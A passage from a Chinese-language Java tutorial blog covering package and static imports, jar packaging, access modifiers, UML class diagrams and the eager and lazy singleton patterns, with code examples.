有的时候比较麻烦，可使用包.*来进行加载。使用*也不会全部加载。但是在开发中采用的是“包.*”的形式进行的包的导入，有可能会有两个不同的包中有相同的类名称。这个时候会出现引用不明确，此时解决办法是写上类的完整名称。</p><h5 id="包的静态导入"><a href="#包的静态导入" class="headerlink" title="包的静态导入"></a>包的静态导入</h5><p>​    假如现在有一个类，这个类中的全部方法都是static方法，按照原始的做法必须全部导入“包.类”，而后通过类名称调用这些静态方法。</p><p>范例：定义一个MyMath类，里面所有方法都是static</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> package2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMath</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>... args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> temp : args) &#123;</span><br><span class="line">            sum += temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x - y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果此时按照原始的方式进行导入处理，那么此时就需要导入包.类，而后通过类名称进行调用。</p><p>范例：原始方式使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> packageTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> package2.MyMath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(MyMath.add(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>));</span><br><span class="line">        System.out.println(MyMath.sub(<span class="number">30</span>,<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    从JDK1.5之后对于类中全部由静态方法提供的特殊类是可以采用静态导入处理的。</p><p>范例：静态导入处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> packageTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> package2.MyMath.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(add(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>));</span><br><span class="line">        System.out.println(sub(<span class="number">30</span>,<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    当使用了静态导入处理之后就好比该方法是直接定义在主类之中，可以由主类直接调用。但实际很少这么写。</p><h5 id="Jar命令"><a href="#Jar命令" class="headerlink" title="Jar命令"></a>Jar命令</h5><p>​    当一个项目开发完成后一定会存在大量的*.class文件，那么对于这些文件的管理，我们可以用一种特殊的压缩结构进行处理，而这样的结构在java中被称为jar文件，可直接用Jar命令完成。</p><p>​    1、定义一个程序类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> package3;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jar命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、对程序进行编译与打包处理：</p><p>​        对程序打包编译：javac -d . Message</p><p>​        此时会形成cn的包，包里面有相应的子包与*.class文件，将其打包为my.jar</p><p>​    3、每一个*.jar文件都是一个独立的程序路径，如果想在Java程序之中使用此路径，则必须使用CLASSPATH进行配置</p><p>​    4、运行。</p><p>​    如果没有配置正确则会出现NoClassDefFoundError错误，出现这种错误只有一种情况：*.jar包没有配置正确。</p><p>​    在JDK1.9以前实际上提供的是一个所有类的*.jar文件（rt.jar、tools.jar);只要启动了java虚拟机，就会加载。</p><p>​    在JDK1.9之后，将一个很大的*.jar文件变成了若干个模块文件。这样在启动的时候可以根据程序加载指定的模块，启动速度会变快。</p><h5 id="系统常见包"><a href="#系统常见包" class="headerlink" title="系统常见包"></a>系统常见包</h5><p>​    java语言从发展至今一直提供有大量的支持类库，那么这些类库一般由两个方面组成：</p><p>​    1、Java自身提供的（除了JDK提供的类库之外还会有一些标准）；</p><p>​    2、由第三方厂商提供的Java支持类库，可以完成各种你所需要的功能，并且支持的厂商很多；</p><p>​    而在JDK中也会有大量的类库，并且类库封装在不同的开发包之中的。</p><p>​    — java.lang：像String、Number、Object等类都在这个包里面，这个包在JDK1.1之后自动导入。</p><p>​    — java.lang.reflect：反射机制处理包，所有的设计从此开始；</p><p>​    — java.util：工具类的定义，包括数据结构的定义；</p><p>​    — java.io：输入与输出流操作的程序包；</p><p>​    — java.net：Java网络编程的包；</p><p>​    — java.sql：进行数据库编程的开发包；</p><p>​    — java.applet：Java的最原始的使用形式，直接嵌套在网页上执行的程序类。现在的程序已经以Application为主了（由主方法的程序）；</p><p>​    — java.awt、javax.swing：Java的图形界面开发包（GUI）</p><h5 id="访问控制权限"><a href="#访问控制权限" class="headerlink" title="访问控制权限"></a>访问控制权限</h5><p>​    在面向对象的开发过程之中有三大主要特点：封装、继承、多态。对于封装性而言主要的实现依靠的就是访问控制权限。而访问控制权限在程序之中一共定义有四种：private、default（不写）、protected、public，这四种权限的作用如下。</p><table><thead><tr><th>No.</th><th>访问范围</th><th>private</th><th>default</th><th>protected</th><th>public</th></tr></thead><tbody><tr><td>1</td><td>同一包中的同一类</td><td>🉑️</td><td>🉑️</td><td>🉑️</td><td>🉑️</td></tr><tr><td>2</td><td>同一包中的不同类</td><td></td><td>🉑️</td><td>🉑️</td><td>🉑️</td></tr><tr><td>3</td><td>不同包的子类</td><td></td><td></td><td>🉑️</td><td>🉑️</td></tr><tr><td>4</td><td>不同包的所有类</td><td></td><td></td><td></td><td>🉑️</td></tr></tbody></table><p>​    在整个访问控制权限的处理之中，只有protected（受保护）的权限是比较新的概念，那么下面对这一访问权限的使用进行说明：</p><p>范例：定义两个类：</p><p>​    1、cn.mldn.a.Message类：提供有protected访问权限</p><p>​    2、cn.mldn.b.NetMessage类：将直接访问protected属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.mldn.a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    定义子类与父类不在同一个包中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.mldn.b;</span><br><span class="line"><span class="keyword">import</span> cn.mldn.a.Message;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NetMessage</span> <span class="keyword">extends</span> <span class="title class_">Message</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">super</span>.info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    编写测试类，通过子类实现操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.mldn.test;</span><br><span class="line"><span class="keyword">import</span> cn.mldn.b.NetMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMessage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NetMessage</span>().print();<span class="comment">//输出mes9s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时的程序是通过子类访问了父类中的protected属性。但是如果此时直接通过Message访问info属性，就会错误。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.mldn.test;</span><br><span class="line"><span class="keyword">import</span> cn.mldn.a.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMessage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Message</span>().info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073601.jpg"                      alt="image-20220710225152000"                ></p><p>​    在程序之中的封装一般有三个对应的访问权限：private、default、protected，但是如果每次在使用的时候进行区分会很麻烦，下面提供一个参考的方案，有时需要调整。：</p><p>​    <strong>只要是进行属性的定义，全部使用private；</strong></p><p>​    <strong>只要进行方法的定义，全部使用public。</strong></p><hr><h4 id="UML图形"><a href="#UML图形" class="headerlink" title="UML图形"></a>UML图形</h4><p>​    UML是统一的建模语言，本质就是利用图形化的形式来实现程序类关系的描述。在之前已经画出了大量的，这些图形是按照UML标准进行的，并且最早并且使用最广泛的设计工具：Rational Rose，而后出现了越来越多的设计工具，而像PowerDesigner也可以实现类图的定义。</p><h5 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h5><p>​    一般情况进行类的描述，往往可以采用三层的结构描述：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073602.jpg"                      alt="image-20220711004241555"                ></p><p>​    如果要是一个普通类的名称，往往直接编写即可，而如果是抽象类，往往使用斜体描述。“类名称”，所以为了更加清楚描述，往往在抽象类上再加一个“abstract”。</p><p>​    对于类中的属性可以使用“访问权限 属性名称：属性类型”的格式来进行定义，而对于访问权限基本上重点只考虑三个public（+）、protected（#）、private（-）。</p><p>​    类中的方法采用的格式也是“访问权限 方法名称()：返回值”结构来描述，一般的方法都是public声明。</p><p>​    类图、时序图、用例图软件自己研究。</p><hr><h4 id="单例设计模式"><a href="#单例设计模式" class="headerlink" title="单例设计模式"></a>单例设计模式</h4><p>​    单例设计模式（多例设计模式）主要是一种控制实例化对象产生个数的设计操作。</p><h5 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h5><p>​    如果说现在有一个程序类，假设该程序类的定义如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单例设计模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test38</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instanceA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">      <span class="type">Singleton</span> <span class="variable">instanceB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">        instanceA.print();</span><br><span class="line">      instanceB.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    但是由于某些要求，现在要去Singleton这个类只允许提供有一个实例化对象。那么此时首先控制的就是构造方法。因为所有的新的实例化对象产生了，那么一定要调用构造方法，如果构造方法“没有了”，那么我们自然就没办法产生实例化对象了。</p><p>范例：此时构造方法私有化了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;<span class="comment">//构造方法私有化了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test38</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//声明对象未出错</span></span><br><span class="line">        instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();<span class="comment">//实例化出错，java: Singleton() 在 two.Singleton 中是 private 访问控制</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    但是现在是有一个严格要求的：必须有一个实例化对象。所有必须想办法产生一个实例化对象交给客户端调用。那么这个时候的分析如下。</p><p>​    1、private访问权限的主要特点在于：不能再类外部访问，但是可以在类本身访问，所以可以考虑在类的内部调用构造。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单例设计模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();<span class="comment">//内部</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;<span class="comment">//构造方法私有化了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test38</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//声明对象</span></span><br><span class="line">        <span class="comment">//instance = new Singleton();//实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、此时Singleton类内部的instance属于一个普通的属性，而普通属性是在有实例化对象之后才会被调用的，而这个时候外部无法产生实例化对象，所以这个属性不能被访问到，那么就必须考虑如何在没有实例化对象的时候获取此属性，那么只有一个属性可以，static属性可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单例设计模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;<span class="comment">//构造方法私有化了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test38</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//声明对象</span></span><br><span class="line">        instance = Singleton.instance;<span class="comment">//实例化</span></span><br><span class="line">        instance.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、类中的属性应该封装后使用，所以理论上此时的instance需要被封装起来，那么就需要通过一个static方法获得。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单例设计模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;<span class="comment">//构造方法私有化了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test38</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//声明对象</span></span><br><span class="line">        instance = Singleton.getInstance();<span class="comment">//实例化</span></span><br><span class="line">        instance.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4、整个代码从头强调的是只有一个实例化，这个时候虽然提供有static的实例化对象，但是这个对象依然可以被重新实例化。所以需要保证此时Singleton类内部的instance无法再次实例化，那么应该使用final定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单例设计模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;<span class="comment">//构造方法私有化了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test38</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//声明对象</span></span><br><span class="line">        instance = Singleton.getInstance();<span class="comment">//实例化</span></span><br><span class="line">        instance.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在很多情况下有些类是不需要重复产生对象的，例如：如果一个程序启动，那么现在肯定需要有一个类负责保存有一些程序加载的数据信息。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073605.jpg"                      alt="image-20220711014548992"                ></p><p>​    对于单例设计模式也分为两种：懒汉式、饿汉式。在之前定义的都属于饿汉式。在系统加载类的时候就会自动提供有Singleton类的实例化对象。而还有一种是懒汉式，在第一次使用的时候进行实例化对象处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单例设计模式,饿汉</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton1</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton1</span>();<span class="comment">//删除final</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton1</span><span class="params">()</span> &#123;&#125;<span class="comment">//构造方法私有化了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton1 <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>)&#123;<span class="comment">//第一次使用</span></span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton1</span>();<span class="comment">//实例化对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test39</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton1</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//声明对象</span></span><br><span class="line">        instance = Singleton1.getInstance();<span class="comment">//实例化</span></span><br><span class="line">        instance.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    